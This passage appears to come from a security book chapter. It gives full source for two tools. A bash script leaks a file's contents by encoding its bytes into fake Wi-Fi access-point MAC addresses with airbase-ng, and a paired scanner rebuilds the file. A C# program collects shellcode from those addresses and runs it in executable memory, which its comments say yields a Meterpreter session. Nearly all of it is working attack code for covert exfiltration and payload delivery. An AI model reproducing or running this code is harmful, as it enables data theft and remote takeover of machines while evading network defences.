\"help\" ]\n\r\n\rthen\n\r\n\rtput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"Example Step1: (Client Side ) ./NativePayload_BSSID.sh -f text-file Fake-AP-Name MonitorMode-Interface\"\n\r\n\r        echo \"Example Step2: (Server Side ) ./NativePayload_BSSID.sh -s wlanx Exfil-Dump-file\"\n\r\n\r        echo \"example System A : ./NativePayload_BSSID.sh -f mytext.txt myfakeAP Wlan3mon\"\n\r\n\r        echo \"example System B : ./NativePayload_BSSID.sh -s wlan0 ExfilDumped.txt\"\n\r\n\r        echo \"Description: with Step1 (system A) you will inject bytes for (mytext.txt) file to BSSID for Fake AP in this case (myfakeAP) , with Step2 on (system B) you can have this text file via Scanning Fake AP on AIR by Wireless traffic (Using iwlist tool)\"\n\r\n\r        echo \"Note : before step1 you should make MonitorMode Interface (WlanXmon) by this command for example : airmon-ng start wlan3 \"\n\r\n\r        echo\n\r\n\r        \n\r\n\rfi\n\r\n\r \n\r\n\r# ./NativePayload_BSSID.sh -f mytext.txt Fake wlan1mon0\n\r\n\r# making fake mode\n\r\n\rif [ $1 == \"-f\" ]\n\r\n\rthen\n\r\n\r        for bytes in `xxd -p -c 5 $2 | sed \'s/../&amp;:/g\'`; \n\r\n\r         do\n\r\n\r           tput setaf 6;        \n\r\n\r           Exfil=\"${bytes::-1}\"\n\r\n\r           text=`echo $Exfil | xxd -r -p`\n\r\n\r           Time=`date \'+%d/%m/%Y %H:%M:%S\'`                    \n\r\n\r           echo \"[!] [$Time] #Injecting text: \"\\\"$text\\\" \"to Mac via BSSID\" 00:$Exfil \"for FAKE AccessPoint: \" $3\n\r\n\r           sleep 0.3\n\r\n\r           tput setaf 9;        \n\r\n\r           # Making Fake AP via airbase and Injecting Payloads to BSSIDs (MAC Address)\n\r\n\r           killairbase | airbase-ng -a 00:$Exfil --essid $3 -I 10 -0 $4 | grep started         \n\r\n\r \n\r\n\r         done\n\r\n\r         Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r         tput setaf 6;\n\r\n\r         echo \"[&gt;] [$Time] Setting Finish Flag to BSSID...\"\n\r\n\r         sleep 0.3\n\r\n\r         tput setaf 9;\n\r\n\r         killairbase | airbase-ng -a 00:ff:00:ff:00:ff --essid $3 -I 10 -0 $4 | grep started         \n\r\n\rfi\n\r\n\r# ./NativePayload_BSSID.sh -s wlan0 myExfildump.txt\n\r\n\r# starting scan mode\n\r\n\rif [ $1 == \"-s\" ]\n\r\n\rthen\n\r\n\recho \"Scanning Mode by \\\"Iwlist\\\" tool Started.\"\n\r\n\recho \"\" &gt; $3\n\r\n\rwhile true\n\r\n\r do\n\r\n\r  # echo `iwlist \'wlan0\' \'scan\' | grep -e \"Address: 00:\"` &gt;&gt; $2 ;\n\r\n\r  echo `iwlist $2 \'scan\' | grep -e \"Address: 00:\"` &gt;&gt; $3 ;\n\r\n\r  tput setaf 9;        \n\r\n\r  Time=`date \'+%d/%m/%Y %H:%M:%S\'`         \n\r\n\r  echo \"[!] [$Time] iwlist AP list Dumped to file: \" $3;\n\r\n\r  sleep 6 ;\n\r\n\r        FinishFlag=`cat $3 | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`\n\r\n\r        if (( `echo ${#FinishFlag}` !=0 ))\n\r\n\r        then\n\r\n\r        Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r        sleep 0.3\n\r\n\r        tput setaf 7;        \n\r\n\r        echo \"[!] [$Time] Finish flag BSSID Address Detected :\" 00:ff:00:ff:00:ff\n\r\n\r        break\n\r\n\r        fi\n\r\n\r done\n\r\n\r tput setaf 9;        \n\r\n\r# fold -w37 $3 &gt; output.txt ;\n\r\n\rTime=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\recho \"[&gt;] [$Time] AP List saved to\" \\\"temp.txt\\\" \"file\"\n\r\n\recho\n\r\n\r \n\r\n\r# DEBUG\n\r\n\r# cat output.txt\n\r\n\rfold -w37 $3 &gt; temp.txt;\n\r\n\r awk {\'print $5\'} temp.txt &gt; temp2Awk.txt;\n\r\n\r # using \'!a[$0]++\' is not good idea ;) sometimes.... . \n\r\n\r  for ops in `awk \'!a[$0]++\' temp2Awk.txt | xxd -p`; \n\r\n\r        do\n\r\n\r        ops1=`echo $ops | xxd -r -p`\n\r\n\r        ops2=`echo $ops | xxd -r -p | xxd -r -p`\n\r\n\r        echo $ops1 \"==&gt;\" $ops2\n\r\n\r        done\n\r\n\r   echo\n\r\n\r   echo \"[!] your Injected Bytes via BSSID Addresses: \"\n\r\n\r   echo\n\r\n\r   echo `awk \'!a[$0]++\' temp2Awk.txt`\n\r\n\r   echo\n\r\n\r   echo \"[!] your Text/Data: \"\n\r\n\r   echo\n\r\n\r   ExfilString=`cat temp2Awk.txt | awk \'!a[$0]++\'`\n\r\n\r   echo \"${ExfilString::-17}\" | xxd -r -p\n\r\n\r   Timestr=`date \'+%d-%m-%Y.%H-%M-%S\'`\n\r\n\r   echo \" \" &gt; ExfilOutput_$Timestr.txt\n\r\n\r   echo\n\r\n\r   echo \"[&gt;] your Text/Data saved to\" \\\"ExfilOutput_$Timestr.txt\\\" \"file\"\n\r\n\r   str=`echo \"${ExfilString::-17}\" | xxd -r -p`\n\r\n\r   echo $str &gt; ExfilOutput_$Timestr.txt\n\r\n\rfi\n\r\n\r \n\r\n\r \n\r\n\rNativePayload_BSSID.cs : \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Text;\n\r\n\rusing NativeWifi;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\r \n\r\n\rnamespace NativePayload_BSSID\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {        \n\r\n\r        static string GetStringForSSID(Wlan.Dot11Ssid ssid)\n\r\n\r        {\n\r\n\r            return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);\n\r\n\r        }\n\r\n\r        \n\r\n\r        static string Temp_BSSID = \"\";\n\r\n\r        static int counter = 0;\n\r\n\r        static WlanClient client = new WlanClient();\n\r\n\r        static bool init = false;\n\r\n\r        static bool onetime = false;\n\r\n\r \n\r\n\r        static string __show_BSSID(string filter_bssid) \n\r\n\r        {\n\r\n\r            try\n\r\n\r            {                              \n\r\n\r                foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {                       \n\r\n\r                        System.Threading.Thread.Sleep(1000);                        \n\r\n\r                        Wlan.WlanBssEntry[] BSSLIST = wlanIface.GetNetworkBssList();\n\r\n\r                        \n\r\n\r                        try\n\r\n\r                        {                          \n\r\n\r                            wlanIface.Scan();                           \n\r\n\r                        }\n\r\n\r                        catch (Exception x1)\n\r\n\r                        {\n\r\n\r                            Console.WriteLine(\"x1: \" + x1.Message);                      \n\r\n\r                        }\n\r\n\r                        Temp_BSSID = \"\";\n\r\n\r                        foreach (Wlan.WlanBssEntry item in BSSLIST)\n\r\n\r                        {\n\r\n\r                            string temp_filter = GetStringForSSID(item.dot11Ssid);\n\r\n\r                            if (temp_filter == filter_bssid)\n\r\n\r                            {                               \n\r\n\r                                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                                Console.Write(\"Detecting BSSID :\");\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                foreach (var item2 in item.dot11Bssid)\n\r\n\r                                {\n\r\n\r                                    Console.Write(\" {0}\", item2.ToString(\"x2\"));\n\r\n\r                                    Temp_BSSID += item2.ToString(\"x2\");\n\r\n\r                                }\n\r\n\r                                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                                Console.Write(\" ESSID :\");\n\r\n\r                                Console.Write(\" \" + GetStringForSSID(item.dot11Ssid));                                \n\r\n\r                            }                            \n\r\n\r                        }\n\r\n\r                        if (Temp_BSSID.Length &gt; 2)\n\r\n\r                        {\n\r\n\r                            // remove 00 from first section , getting payload only since fake macaddress\n\r\n\r                            Temp_BSSID = Temp_BSSID.Substring(2);\n\r\n\r                        }\n\r\n\r                        \n\r\n\r                        if (Temp_BSSID == \"ffffffffff\") init = true;\n\r\n\r \n\r\n\r                        if (init &amp;&amp; MacAddress.Capacity != 0 &amp;&amp; Temp_BSSID != MacAddress.AsEnumerable().Last().ToString() &amp;&amp; Temp_BSSID!=\"ff00ff00ff\" )\n\r\n\r                        {\n\r\n\r                            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                            Console.Write(\" Dumped \");\n\r\n\r                            if (Temp_BSSID != \"\")\n\r\n\r                            {\n\r\n\r                                    /// something is wrong or error happend\n\r\n\r                                    /// sometimes this value is higher than 10 like 20 so we should getting last 10 char for this value always\n\r\n\r                                    /// for dumping new and Correct BSSID\n\r\n\r                                    if (Temp_BSSID.Length &gt; 10) \n\r\n\r                                    {\n\r\n\r                                        Temp_BSSID = Temp_BSSID.Substring(Temp_BSSID.Length - 10);\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                                        Console.Write(\"[X] {0}\", Temp_BSSID);\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                                    }\n\r\n\r \n\r\n\r                                counter++;\n\r\n\r                                MacAddress.Add(Temp_BSSID);\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                        else if (MacAddress.Capacity == 0)\n\r\n\r                        {\n\r\n\r                            Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                            Console.Write(\" Dumped \\n\");\n\r\n\r                            if (Temp_BSSID != \"\" &amp;&amp; Temp_BSSID != \"ffffffffff\")\n\r\n\r                            {\n\r\n\r                                /// something is wrong or error happend\n\r\n\r                                /// sometimes this value is higher than 10 like 20 so we should getting last 10 char for this value always\n\r\n\r                                /// for dumping new and Correct BSSID\n\r\n\r                                    if (Temp_BSSID.Length &gt; 10)\n\r\n\r                                    {\n\r\n\r                                        Temp_BSSID = Temp_BSSID.Substring(Temp_BSSID.Length - 10);\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                                        Console.Write(\"[X] {0}\", Temp_BSSID);\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                                    }\n\r\n\r \n\r\n\r                                counter++;\n\r\n\r                                MacAddress.Add(Temp_BSSID);\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                        else if (Temp_BSSID == \"ff00ff00ff\") \n\r\n\r                        {\n\r\n\r                            // time to exit and run payload\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                            Console.WriteLine(\"\\n Done. \\n\");\n\r\n\r                            Console.WriteLine(\"Running Payload ...\");\n\r\n\r                            return Temp_BSSID;\n\r\n\r                        }\n\r\n\r                        \n\r\n\r                        if (MacAddress.Capacity != 0)\n\r\n\r                        {\n\r\n\r                            Console.WriteLine(\" ==&gt; \" + counter + \" \" + MacAddress.AsEnumerable().Last().ToString());                                                     \n\r\n\r                        }\n\r\n\r \n\r\n\r                    }\n\r\n\r                    catch (Exception ee)\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"e2: \"+ee.Message);                      \n\r\n\r                    }               \n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception eee)\n\r\n\r            {\n\r\n\r                Console.WriteLine(\"e3: \" + eee.Message);                                             \n\r\n\r            }\n\r\n\r            return Temp_BSSID;\n\r\n\r        }\n\r\n\r \n\r\n\r        static List&lt;string&gt; MacAddress = new List&lt;string&gt;();\n\r\n\r        public static string payload = \"\";\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            try\n\r\n\r            {\n\r\n\r \n\r\n\r                if (args.Length &gt;= 1 &amp;&amp; args[0].ToUpper() == \"NULL\")\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"Copy these lines to  script1.sh file ;)\");                    \n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    if (args.Length &gt;= 2 &amp;&amp; args[1] != null) { payload = args[1].ToString(); }\n\r\n\r                    int b = 0;\n\r\n\r                    int j = 0;\n\r\n\r                    int LinesCode = 0;\n\r\n\r                    string temp = \"\";\n\r\n\r                    /// \"00:ff:00:ff:00:ff\" flag for Attack start\n\r\n\r                    Console.WriteLine(\"airbase-ng -a 00:\" + \"ff:ff:ff:ff:ff\" + \" --essid \\\"Fake\\\" -I 10 -0 wlan0mon ;\");\n\r\n\r                    foreach (char item in payload)\n\r\n\r                    {\n\r\n\r                        temp += item;\n\r\n\r                        \n\r\n\r                        b++;\n\r\n\r                        j++;\n\r\n\r                        if (j == 2) { temp += \":\"; j = 0; }\n\r\n\r                        if (b &gt;= 10)\n\r\n\r                        {\n\r\n\r                            /// essid is name for Access point , in this case \"Fake\" ;)\n\r\n\r                            /// -I 10 , don\'t change this one , please \n\r\n\r                            Console.Write(\"airbase-ng -a 00:\" + temp.Substring(0, temp.Length - 1) + \" --essid \\\"Fake\\\" -I 10 -0 wlan0mon ;\");\n\r\n\r                            Console.WriteLine(\"\"); b = 0;\n\r\n\r                            temp = \"\";\n\r\n\r                            LinesCode++;\n\r\n\r                        }\n\r\n\r \n\r\n\r                    }\n\r\n\r                    /// \"00:ff:00:ff:00:ff\" flag for Finish\n\r\n\r                    Console.WriteLine(\"airbase-ng -a 00:\" + \"ff:00:ff:00:ff\" + \" --essid \\\"Fake\\\" -I 10 -0 wlan0mon ;\");                    \n\r\n\r                    \n\r\n\r                    Console.WriteLine(\"\");\n\r\n\r                    Console.WriteLine(\"(\" + LinesCode.ToString() + \") Command Lines for this PAYLOAD : \" + payload);                  \n\r\n\r                }\n\r\n\r                else if (args[0].ToUpper() != \"NULL\" &amp;&amp; args[0].ToUpper() != \"HELP\")\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"NativePayload_BSSID Tool Published by Damon Mohammadbagher\");\n\r\n\r                    Console.WriteLine(\"Scanning Access Point : \" + args[0].ToString());\n\r\n\r                    Console.WriteLine();\n\r\n\r                    \n\r\n\r                    while (true)\n\r\n\r                    {\n\r\n\r                    \n\r\n\r                        /// dont change sleep time ;) 8 ... 10 is good \n\r\n\r                        /// if you want change these times then you need change all sleep value in Script1.sh Sleep(Value_Time) too\n\r\n\r                        System.Threading.Thread.Sleep(8000);\n\r\n\r                       \n\r\n\r                        string _tmp_bssid = __show_BSSID(args[0]);\n\r\n\r                       \n\r\n\r                        /// flag for finish and execute Payload for getting Meterpreter Session\n\r\n\r                        if (_tmp_bssid == \"ff00ff00ff\") break;\n\r\n\r                    }\n\r\n\r \n\r\n\r                    /// time to getting Meterpreter Session ;)\n\r\n\r                    byte[] _X_Bytes = new byte[MacAddress.Capacity * 5];\n\r\n\r                    int b = 0;\n\r\n\r                    foreach (string X_item in MacAddress)\n\r\n\r                    {\n\r\n\r                        for (int i = 0; i &lt;= 8; )\n\r\n\r                        {\n\r\n\r                            /// for debug only\n\r\n\r                            /// string MacAddress_Octets = X_item.ToString().Substring(i, 2);                 \n\r\n\r \n\r\n\r                            _X_Bytes[b] = Convert.ToByte(\"0x\" + X_item.ToString().Substring(i, 2), 16);\n\r\n\r \n\r\n\r                            b++;\n\r\n\r\n\r\n\r                            i++; i++;\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"Dumped Payloads : \");\n\r\n\r                        int k = 0;\n\r\n\r                        foreach (string item in MacAddress)\n\r\n\r                        {\n\r\n\r                            Console.Write(k.ToString() + \": \" + item.ToString() + \" \");\n\r\n\r                            k++;\n\r\n\r                        }\n\r\n\r                        Console.WriteLine(\"15 sec Waiting....\");\n\r\n\r                        System.Threading.Thread.Sleep(15000);\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                        Console.WriteLine(\"End time : {0}\", DateTime.Now.ToString());\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"Bingo Meterpreter session by BSSID and WIFI Traffic ;)\");\n\r\n\r                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)_X_Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                        Marshal.Copy(_X_Bytes, 0, (IntPtr)(funcAddr), _X_Bytes.Length);\n\r\n\r                        IntPtr hThread = IntPtr.Zero;\n\r\n\r                        UInt32 threadId = 0;\n\r\n\r                        IntPtr pinfo = IntPtr.Zero;\n\r\n\r                        // execute native code\n\r\n\r                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                        WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r \n\r\n\r                    }\n\r\n\r                    catch (Exception e6)\n\r\n\r                    {\n\r\n\r \n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"Main Error : {0}\", e6.Message);\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                else if(args[0].ToUpper()==\"HELP\")\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"NativePayload_BSSID Tool Published by Damon Mohammadbagher\");\n\r\n\r                    Console.WriteLine(\"Transferring Payload on AIR by BSSID and WIFI Traffic \\n\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                    Console.WriteLine(\"syntax 1 : Making Script.sh File for making Fake AP\");\n\r\n\r                    Console.WriteLine(\"\\t   and injecting Payloads to AP MAC-Address by airbase-ng \\n\");\n\r\n\r                    Console.WriteLine(\"syntax 1 : NativePaylaod_BSSID.exe null \\\"payload string\\\"\");\n\r\n\r                    Console.WriteLine(\"syntax 1 : NativePaylaod_BSSID.exe null \\\"fce80f109ab0371fbcd1100...\\\"\\n\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                    Console.WriteLine(\"syntax 2 : NativePaylaod_BSSID.exe \\\"Name for Access point OR essid\\\"\");\n\r\n\r                    Console.WriteLine(\"syntax 2 : NativePaylaod_BSSID.exe \\\"fake\\\"\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception e)\n\r\n\r            {\n\r\n\r \n\r\n\r                Console.WriteLine(e.Message);\n\r\n\r            }\n\r\n\r        \n\r\n\r        }\n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   \n\r\n\r    }\n\r\n\r     \n\r\n\r}","","topics\\Chapter 9.html");